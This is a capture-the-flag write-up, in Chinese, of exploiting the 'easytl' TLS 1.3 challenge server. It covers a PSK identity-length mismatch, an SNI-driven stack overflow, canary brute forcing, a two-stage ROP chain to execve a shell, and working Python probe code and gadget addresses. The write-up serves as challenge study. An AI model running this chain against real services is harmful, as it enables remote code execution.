# easytl

## 题目信息

- 题目类型：Pwn（TLS 1.3 服务）
- 题目描述：“一个正常的服务器，快来试试吧。”入口 `nc 47.105.112.170 1443`（同题另有 2443/3443/4443/5443）。附件为 `easytl`、`server.crt`、`server.key`。
- 附件或题目入口：`easytl_536a482cd0b0b2446ec6be3ac06e9487/easytl/`；远端 `47.105.112.170:1443`

## 解题思路

程序只支持 TLS 1.3 的 `TLS_AES_256_GCM_SHA384`，握手完成后是自定义的 4 字节操作码对象存储协议。逆向后能看到对象 tag 是 `MD5(data)`，另外有两个特殊 tag 分支（get 时 `strcat`、update 时 `free` 造成 UAF），但要命中它们需要 MD5 原像，实际不可达；二进制里的 48/96 字节十六进制常量只是诱饵，按这些常量拼出来的 flag 都被平台否定。

真正的入口在 TLS 回调。`SSL_CTX_set_info_callback` 注册的 0x4030D5 在 alert 分支里调用 0x40304D：

```c
memset(buf, 0, 80);
memcpy(buf, qword_970F60, dword_970F68);
fprintf(stderr, "%s error\n", buf);
```

`buf` 只有 88 字节，`g68` 由 SNI 长度控制。同时，`SSL_CTX_set_psk_find_session_callback` 注册的回调（0x402DBB）用 `strlen(identity)==32` 校验，却按 ClientHello 里声明的 `identity_len` 做 `calloc(identity_len+16)` 和 `memcpy` —— 只要前 32 字节等于常量、后面跟一个 `\x00`，`strlen` 仍是 32，声明长度却可以任意大，`qword_970F40` 的内容就完全可控。把这两个点接起来，就是一条从 PSK 握手到栈溢出的完整链。

## 解题过程

### 1. 握手与对象存储

服务端证书在附件里，正常 TLS 握手即可。握手后发送 4 字节小端操作码和参数，对象结构为：

```
+0x00 MD5(data)[16]
+0x18 next
+0x20 key[16]
+0x38 iv[16]
+0x50 data
+0x58 len (<=0x380)
```

add/get 实测可用：写入 `hello` 后用 `md5("hello")` 能读回。特殊 tag `66558c3de56c1d3eddb3e8c3ec59e6d1`、`66448c3de56c4d3e11b3e8c4ec59e6d1` 是两条危险分支的入口，但对象 tag 是真实 MD5，找不到原像，这条路放弃。

### 2. PSK 握手：s_client 失败的原因

PSK 回调要求 identity 是 32 字节常量：

```
1401518dc5d7641ccd41593a5d812410
```

并用 48 字节常量 key 计算会话主密钥：

```
c8ad2a35c51b87a466e22bc337696f0807ff73500ee154ee71bee86d0b6bc358422a0e90fca2ac1be5929a7be06fd428
```

即 `PSK = HMAC-SHA512(key, identity)`（64 字节）。直接用 `openssl s_client -tls1_3 -psk ...` 会失败，服务端报：

```
tls_parse_ctos_psk:bad extension:../ssl/statem/extensions_srvr.c:1199
```

对应 OpenSSL 3.0.13 源码的 `PACKET_remaining(&binder) != hashsize`：s_client 用 SHA256 生成 32 字节 binder，而服务端唯一套件 `TLS_AES_256_GCM_SHA384` 要求 48 字节 SHA384 binder。

自己构造 ClientHello 即可：SNI、supported_versions、psk_key_exchange_modes(`psk_dhe_ke`)、key_share、pre_shared_key（最后一个扩展）。binder 算法为：

```python
early = HMAC(hash=SHA384, key=b"\x00"*48, msg=PSK)
binder_key = HKDF-Expand-Label(early, b"ext binder", SHA384(b""), 48)
finished_key = HKDF-Expand-Label(binder_key, b"finished", b"", 48)
binder = HMAC(finished_key, SHA384(ClientHello 截断到 identities 末尾))
```

实测本地和远端都收到 ServerHello（245 字节），PSK 握手成立。

### 3. identity 长度错配

回调校验的是 C 字符串长度，复制的是报文声明长度。把 identity 构造成：

```
32 字节常量 + \x00 + payload
```

并在 PSK identity entry 里声明 `identity_len = 32 + 1 + len(payload)`。`strlen` 仍为 32、`memcmp` 仍通过，但回调会 `calloc(identity_len+16)` 并 `memcpy(identity_len)`，整段 payload 进入 `qword_970F40`。gdb 在 0x40304D 下断点可以看到：

```
LOG g40=0x9dd870 g68=120
0x9dd870: ... "1401518dc5d7641ccd41593a5d812410"
0x9dd890: 00 41 41 41 ... 43 43 43 43 43 43 43 43
0x9dd8d8: bd 51 42 00 ... (POP_RDI)
```

### 4. 栈溢出与 canary

收到合法 ClientHello 后，客户端如果在握手途中发送坏记录，服务端进入 alert，info callback 调用 0x40304D，`g68` 等于 SNI 长度。SNI 长度受 OpenSSL 限制最大 255，且不能含 `\x00`。栈上布局固定：

```
buf[0..87]    栈缓冲区
buf[88..95]   canary
buf[96..103]  saved rbp
buf[104..]    返回地址 / ROP
```

本机用 gdb 读 canary 后直接验证了整条链；远端是 fork 服务器，父进程 canary 固定。把 SNI 长度设为 `88+k`，只覆盖 canary 的前 k 字节，其余字节保持原值；猜对前缀时 canary 校验通过，回调正常返回并裸写 5 字节 `"error"`，猜错则子进程 abort。用这个 oracle 逐字节爆破，最终得到远端 canary：

```
[+] canary so far: 00cb050b73dccd3a
RESULT 00cb050b73dccd3a
```

内存字节序为 `00 cb 05 0b 73 dc cd 3a`。

### 5. 两段式 ROP

SNI 上限 255，第一段 ROP 最多放在 src[104:255]。因此第一段只做 `read(4, BSS, 512)` 和 `leave; ret`，把栈 pivot 到可写的 BSS（0x971000）。saved rbp 设为 BSS，第一段执行完后 `leave; ret` 正好从 BSS 继续执行第二段。

第二段做：

```
read(4, BSS+0x200, 512)                  # 读入路径/命令/argv
execve(BSS+0x200, BSS+0x300, 0)          # /bin/sh -c <cmd>
```

命令通过 `>&4` 重定向回客户端 socket。注意不能写 `/proc/self/fd/4`：socket 通过 procfs 打开会得到 `No such device or address`，必须用 shell 的 fd 复制。

固定 gadget（二进制为 ET_EXEC，无 PIE）：

```
pop rdi; ret      0x4251bd
pop rsi; ret      0x5e9a79
pop rdx; ret      0x52f0d2
pop rax; ret      0x5f6c9a
syscall; ret      0x76e706
leave; ret        0x402db9
```

### 6. 取 flag

拿到 canary 后执行：

```sh
/tmp/remote_pwn.sh 00cb050b73dccd3a 4
```

远端执行多路径 `cat`，实际命中 `/home/ctf/flag`：

```
flag{e17a75032670d5df9a28077b982b0d5d}
```

服务器上 `/root/flag.txt`、`/flag`、`/flag.txt` 都不存在；逐路径确认后旗标文件为 `/home/ctf/flag`。再用 `od` 和 `md5sum` 做字节级校验：

```
66 6c 61 67 7b 65 31 37 61 37 35 30 33 32 36 37
30 64 35 64 66 39 61 32 38 30 37 37 62 39 38 32
62 30 64 35 64 7d
4cbf92e46683ae89953f615a41a26536  /home/ctf/flag
38
```

文件共 38 字节、无换行，三次独立连接提取内容一致。

## 复现脚本

- 完整利用脚本：`solve/exploit/easytl_exploit.py`
- 远端执行入口：`solve/exploit/remote_pwn.sh`
- 调试/本地验证脚本：`solve/exploit/local_test.sh`
- 过程记录：`solve/notes.md`

核心部分（ClientHello/binder 与 canary 探测）：

```python
KEY = bytes.fromhex("c8ad2a35c51b87a466e22bc337696f08"
                    "07ff73500ee154ee71bee86d0b6bc358"
                    "422a0e90fca2ac1be5929a7be06fd428")
ID  = b"1401518dc5d7641ccd41593a5d812410"
PSK = hmac.new(KEY, ID, hashlib.sha512).digest()
HASH, HL = hashlib.sha384, 48

def hkdf_label(secret, label, ctx, length):
    info = H(length) + bytes([6 + len(label)]) + b"tls13 " + label + bytes([len(ctx)]) + ctx
    t = b""; okm = b""; i = 1
    while len(okm) < length:
        t = hmac.new(secret, t + info + bytes([i]), HASH).digest()
        okm += t; i += 1
    return okm[:length]

def make_binder(ch_prefix):
    early = hmac.new(b"\x00" * HL, PSK, HASH).digest()
    bk = hkdf_label(early, b"ext binder", HASH(b"").digest(), HL)
    fk = hkdf_label(bk, b"finished", b"", HL)
    return hmac.new(fk, HASH(ch_prefix).digest(), HASH).digest()
```

canary 探测时，payload 只写 `88+k` 字节，把 SNI 长度也设为 `88+k`，只覆盖 canary 前缀；命中时 socket 会额外收到裸 `"error"`：

```python
def canary_probe(prefix, server, port=1443, timeout=0.45):
    src = ID + b"\x00" + b"A" * 55 + prefix   # src[88:88+len(prefix)] = canary 前缀
    host = b"A" * len(src)                    # 复制长度 = 88 + len(prefix)
    s, out = open_hello(host, src, server=server, port=port)
    s.sendall(b"\x17\x03\x03" + H(64) + os.urandom(64))  # 触发 alert
    data = read_for(s, timeout)
    return b"error" in data
```

爆破命令：

```sh
python3 -c 'import sys;sys.path.insert(0,"/tmp");import easytl_exploit as e;print(e.brute_canary(server="47.105.112.170"))'
```

拿到 canary 后执行：

```sh
/tmp/remote_pwn.sh <canary_hex> 4
```

## Flag

`flag{e17a75032670d5df9a28077b982b0d5d}`

来源：远端 ROP 执行 shell 命令，`od -An -tx1 /home/ctf/flag`、`md5sum /home/ctf/flag`、`stat -c %s /home/ctf/flag` 读取并校验 `/home/ctf/flag`。

验证状态：已获取并从远端独立提取 3 次，内容与字节级校验一致；平台提交通过（100 分）。
